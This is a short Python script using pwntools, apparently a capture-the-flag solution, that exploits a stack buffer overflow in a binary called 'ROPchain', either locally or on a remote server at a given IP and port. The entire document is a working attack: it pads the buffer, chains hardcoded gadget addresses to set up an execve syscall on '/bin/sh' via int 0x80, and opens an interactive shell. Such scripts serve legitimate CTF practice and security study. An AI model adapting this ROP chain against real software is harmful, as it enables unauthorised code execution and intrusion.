from pwn import *
import sys

def exploit(option):
	if option == 1:
		p = process('./ROPchain')
	elif option == 2:
		p = remote('45.122.249.68',10002)


	pop_eax = 0x080a89e6
	#: pop edx ; pop ecx ; pop ebx ; ret
	pop_edx_ecx_ebx = 0x0806e051 
	int_0x80 = 0x080495a3 			#: int 0x80
	bin_sh = 0x080d9068 			#: /bin/sh
	p.recvuntil(':\n')
	payload = b''
	payload += b'a'*0x8c
	payload += p32(pop_edx_ecx_ebx) + p32(0) +p32(0) + p32(bin_sh)
	payload += p32(pop_eax) + p32(0xb)
	payload += p32(int_0x80)
	p.send(payload)
	p.interactive()


exploit(int(sys.argv[1]))
